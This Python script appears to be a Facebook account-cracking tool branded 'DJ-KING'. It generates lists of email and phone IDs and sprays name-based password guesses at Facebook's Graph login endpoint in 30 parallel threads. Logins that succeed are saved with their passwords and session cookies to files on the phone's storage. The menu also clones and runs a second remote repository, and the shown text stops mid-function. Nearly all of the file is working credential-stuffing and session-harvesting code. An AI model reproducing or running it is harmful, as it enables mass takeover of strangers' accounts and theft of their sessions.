 ####@-----Import-----@####
import os,base64

os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
 pass
except:pass


import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError 
from concurrent.futures import ThreadPoolExecutor as speed

accounts = []
loop = 0




###USERAGENTSGEN####
'''
Davik/2.1.0 (Linux; U; Android 10; SM-A022F Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/319.0.0.1.47;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/532442764;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBDV/SM-A022F;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

'''
ua = []
import requests
r=requests.get
ua = []
del ua
"""
Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]
"""

ua=[]

##Logo##
P = '\x1b[1;97m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed

	
logo=("""\033[1;97m
_______                  
/       \                 
$$$$$$$  |             __ 
$$ |  $$ |            /  |
$$ |  $$ |            $$/ 
$$ |  $$ |            /  |
$$ |__$$ |            $$ |
$$    $$/             $$ |
$$$$$$$/         __   $$ |
                /  \__$$ |
                $$    $$/ 
                 $$$$$$/  
 
\033[1;91m---------------------------Dj-KING---------------------------
\033[1;91m[*] CREATOR   >\033[1;32m DJ-KING
\033[1;91m[*] FACEBOOK  > \033[1;32m KING ISLAM 
\033[1;91m[*] GITHUB    >\033[1;32m SEX
\033[1;91m[*] VERSION   > \033[1;32m 0.1
\033[1;91m[*] WHATSAPP  >\033[1;32m +88013********
\033[1;32m---------------------------Dj-KING---------------------------"""  )

####@-----Menu-----@####
def Main():
    os.system("clear")
    print(logo)
    print(f"\033[1;97m[1] File Cloning")
    print(f"[2] Pak Random Cloning")
    print(f"[3] Gmail Cloning")  
   
    print(f"[0] Exit")
    inpp = input(f"[+] Your Choice : ")
    if inpp == "1":
        file()
    if inpp == '2':
     print(f' Run Random Tool ')
     os.system('cd && git clone https://github.com/KINGzada123/sana.git')
     os.system('cd && cd sana ;python sana.py')
    if inpp =='3':
        remove_double()
    if inpp == "0":
     exit()
    else:
        print ('        Invalid Select')
    Main()
     
l = []

####@-----File-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.KING'
    else:
        file = input(f"[+]Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        Hxw_Main()
     
    method()
    exit()
    
            
   
####@-----AppCheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=KING-33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=KING-2233]'))


####@-----Gmail-----@####

def gmail():     
	
        os.system("clear");print(logo)
        first = input(f'{("[+]")}Put First Name: ')
        last = input(f'{("[+]")}Put Last Name: ')
        domain = input(f'{("[+]")}Put Domain: ')
        try:
            limit = input(f'{("[+]")}Put Limit: ')
        except ValueError:
            limit = 5000
        lists = ['3','4']
        for xd in range(int(limit)):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.KING','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.KING','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.KING', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            l.append('gm')
            file()

       
        
####@-----PakNumber-----@####


def pak():
	os.system("clear");print(logo)
    
	user=[]
	code = input(f'\033[1;37m[+] Put Code : ')
	try:
		limit = int(input(f'\033[1;37m[+] Put Limit : '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	for psx in user:
		ids = code+psx
		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
	andom()


####@-----UserAgent----@####
"""
Mozilla/5.0 (Linux; Android 6.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2442.131 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.2353.104 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2733.140 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2785.85 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2584.75 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.2639.93 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2305.102 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2600.81 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.2822.136 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.2883.77 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.2851.110 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2828.149 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2545.78 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2680.79 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2666.98 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.2683.98 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2548.122 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2785.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2727.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2431.111 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2459.111 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2438.138 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2740.96 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2471.122 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.2568.84 Mobile Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
Mozilla/5.0 (Linux; Android 13; M2101K6G Build/TKQ1.221013.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 11.1; TX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Mozilla/5.0 (Linux; Android 13; SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.76 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 13; V2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 13; SM-N980F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36 OPT/2.9Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Mozilla/5.0 (Linux; Android 13; 2201117SY Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36 OPX/2.0
Mozilla/5.0 (Linux; Android 9; M10A_3G Build/V2_20200522; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Safari/537.36
Mozilla/5.0 (Linux; Android 9; Y8 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.1 Chrome/59.0.3017.125 Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/3.0 Chrome/59.0.3017.125 Safari/537.36
Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Klar/1.0 Chrome/58.0.3029.83 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Safari/537.36
Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36
"""
####@-----FileM-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'[+]Total Password? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'[+]{ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'{(x+1)}Password : '))
            pass
        else:
            print(f"{('!')}Numeric Only")
            exit()
    print(f'\n'+("1")+'Method 1 (Updated)\n'+("2")+'Method 2 (Updated)')
    m=input(f"{('!')}Input : ") 
    print('\n'+("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{('!')}Input : ")
    print('\n'+("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{('!')}Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print('\033[1;97m------------------------------------------------')
    print(f'[+] TOTAL ID : \033[1;92m'+str(len(accounts)))
    print(f"\033[1;97m[+] PROCESS START YOUR BACKGROUND")
    
    print('\033[1;97m------------------------------------------------')
    print()
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r \033[1;97m[\033[1;97mPROCESS\033[1;97m]\033[1;97m {}|{} \033[1;97mOK:{} \033[1;97mCP:{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = "Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36/;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower() 
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mKING-OK\033[1;92m] \033[1;92m'+acc+'\033[1;92m|\033[1;92m'+pword+'')
                open('/sdcard/KING-OK.txt','a').write(f'{acc}|{pword}\n ')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                print(' \033[1;97m'+cookies)
                open('/sdcard/M-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
                
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mKING-CP\033[1;91m] \033[1;97m'+acc+'\033[1;91m|\033[1;97m'+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/KING-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r \033[1;97m[\033[1;97mPROCESS\033[1;97m]\033[1;97m {}|{} \033[1;97mOK:{} \033[1;97mCP:{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mKING-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/KING-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mKING-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/KING-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()  
      

def remove_double():
    os.system("clear")
    print(logo)
    file = input ('\033[0;92m Enter Your File Path : ')
    print(logo)
    os.system(f'sort -u -r -o {file} {file} --quit 2>/dev/null')
    print ('\n[*] SuccessFully Removed Double Links')
    print ('[*] File Saved in : '+file)
    input(f'{linex} \nPress Enter to go back to Main Menu')
    clear()
    check_login()

####@-----Random-----@####
def andom():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o': 
        tpp = input(f'\033[1;37m[+] Enter Pass Limit : ')
        totalpass.append('first')
        totalpass.append('last')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            
            for x in range(int(tpp)):
                totalpass.append(input(f'\033[1;37m[+] Password : '))
            pass
        else:
            print(f"\033[1;37m[+] Numeric Only")
            exit()
    print(f'\n'+("[1]") +'Method 1 \n'+("[2]") +'Method 2 ')
    m=input(f"[+]Input : ") 
    print('\n'+("[+]")+'Show cp id or not(y/n)')
    cpok=input(f"([+])Input : ")
    print('\n'+("[+]")+'Show cookie or not(y/n)')
    c=input(f"[+]Input : ")
    os.system("clear")
    print(logo) 
    print('\033[1;97m------------------------------------------------')
    print(f'[+] TOTAL ID : \033[1;92m'+str(len(accounts)))
    print(f"\033[1;97m[+] PROCESS START YOUR BACKGROUND")
    
    print('\033[1;97m------------------------------------------------')
    
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r \033[1;97m[\033[1;97mPROCESS\033[1;97m]\033[1;97m {}|{} \033[1;97mOK:{} \033[1;97mCP:{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = "Mozilla/5.0 (Linux; Android 10; Infinix X656 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/345.0.0.8.69;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mKING-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/KING-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mKING-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/KING-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   



 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mKING-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/KING-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mKING-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/KING-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

      
    for x in open('.rndm','r').read().splitlines():
